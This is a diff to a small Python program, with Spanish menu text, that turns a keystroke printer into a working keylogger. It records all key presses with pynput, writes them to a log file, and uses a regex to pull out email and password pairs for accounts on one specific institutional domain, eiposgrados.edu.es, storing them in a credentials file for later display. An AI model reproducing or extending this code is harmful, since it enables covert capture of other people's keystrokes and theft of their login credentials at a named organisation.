@@ -1,15 +1,16 @@
 #!/usr/bin/env python
 import enum
 import pathlib
+import re
 
 from pynput import keyboard as kb
 
-keymap = {
-    kb.Key.space: ' ',
-    kb.Key.tab: '\t',
-    kb.Key.enter: '\n',
-    kb.Key.backspace: '\b'
-}
+from processor import KeyProcessor
+
+BASE_DIR = pathlib.Path(__file__).resolve().parent
+LOGS = BASE_DIR / 'keylog.txt'
+CREDENTIALS = BASE_DIR / 'credentials.txt'
+EMAIL_PATTERN = re.compile(r'(?P<email>[^@\s]+@eiposgrados\.edu\.es)\s+(?P<password>[^\s]+)', flags=re.MULTILINE)
 
 
 class Option(enum.Enum):
@@ -18,61 +19,55 @@ class Option(enum.Enum):
     READ_CREDENTIALS = 3
 
 
-def print_data_console(value):
-    print(value, end='')
+def print_data_console(key_pc):
+    key_pc.print_current_key()
 
 
-def save_in_file():
-    pass
+def save_in_file(path, data):
+    with open(path, 'a', encoding='utf-8') as fp:
+        fp.write(data.strip())
 
 
-def detect_eip_password():
-    pass
+def detect_eip_password(path):
+    with open(path, 'r', encoding='utf-8') as fp:
+        data = fp.read()
 
-
-def process(key):
-    value = None
-    if isinstance(key, kb.Key):
-        value = keymap.get(key, '')
-    elif isinstance(key, kb.KeyCode):
-        value = str(key.char)
-
-    return value
+    with open(CREDENTIALS, 'a', encoding='utf-8') as fp:
+        for match in EMAIL_PATTERN.findall(data):
+            fp.write(f'{match[0]} {match[1]}\n')
 
 
 def record_key():
-    buffer = ''
+    key_pc = KeyProcessor()
     with kb.Events() as keyboard_events:
         for event in keyboard_events:
             if event.key == kb.Key.esc:
                 break
             elif isinstance(event, kb.Events.Press):
-                value = process(event.key)
-                if value is not None:
-                    buffer = ''.join([buffer, value])
-                    print_data_console(value)
-    print('\nHa escrito todo esto:\n')
-    print(buffer)
+                key_pc.process(event.key)
+                print_data_console(key_pc)
+
+    save_in_file(LOGS, key_pc.data)
+    detect_eip_password(LOGS)
 
 
-def read_logs(path):
-    with open(path, 'r', encoding='utf-8') as infile:
-        lines = infile.readlines()
-    print(lines)
+def display_file(path):
+    with open(path, 'r', encoding='utf-8') as fp:
+        for line in fp:
+            print(line)
+
+
+def read_logs():
+    display_file(LOGS)
 
 
 def read_credentials():
-    pass
+    display_file(CREDENTIALS)
 
 
-def logo():
-    ascii_art = '''
-     _  __         _ _                   
-    | |/ /___ _  _| | |___  __ _ __ _ ___
-    | ' </ -_) || | | / _ \/ _` / _` (_-<
-    |_|\_\___|\_, |_|_\___/\__, \__, /__/
-              |__/         |___/|___/    
-    '''
+def logo(path):
+    with open(path, 'r', encoding='utf-8') as input_file:
+        ascii_art = ''.join(input_file.readlines())
 
     return ascii_art
 
@@ -89,22 +84,22 @@ def menu():
 
 
 def choose(option):
-    base_dir = pathlib.Path(__file__).resolve().parent
     try:
         option = Option(int(option))
         if option == Option.RECORD_KEYS:
             record_key()
         elif option == Option.READ_LOGS:
-            pass
+            read_logs()
         elif option == Option.READ_CREDENTIALS:
-            pass
+            read_credentials()
+
     except ValueError:
         reason = 'Opción no válida' if len(option) > 0 else 'No se ha elegido nada'
         print(reason)
 
 
 def main():
-    print(logo())
+    print(logo(BASE_DIR / 'logo.txt'))
     stay = True
     while stay:
         print(menu())
